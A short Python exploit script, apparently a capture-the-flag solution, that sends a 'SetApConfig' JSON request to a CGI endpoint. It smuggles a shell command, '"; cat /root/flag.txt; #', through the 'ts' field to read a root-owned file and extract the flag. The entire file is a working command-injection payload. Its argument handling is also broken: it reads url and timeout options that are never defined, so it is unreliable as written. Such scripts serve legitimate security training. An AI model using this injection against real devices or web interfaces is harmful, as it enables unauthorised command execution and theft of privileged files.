#!/usr/bin/env python3


from __future__ import annotations
import argparse
import re
from pathlib import Path
import requests


DEFAULT_URL = "https://omniscient-e999d500fbe5.chall.nnsc.tf/reqDo"
FLAG_RE = re.compile(r"NNS\{[^}\r\n]+\}")


def recover_flag(url: str, timeout: float) -> str:
    payload = {
        "td": "SetApConfig",
        "s": "",
        "p": "",
        "sc": "",
        "sck2": "",
        "lb": "",
        "ts": '"; cat /root/flag.txt; #',
    }

    response = requests.post(url, json=payload, timeout=timeout)
    response.raise_for_status()
    match = FLAG_RE.search(response.text)
    if match is None:
        raise RuntimeError(
            f"the CGI response did not contain a flag: {response.text!r}"
        )
    return match.group(0)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    args = parser.parse_args()

    flag = recover_flag(args.url, args.timeout)
    print(f"[+] flag: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
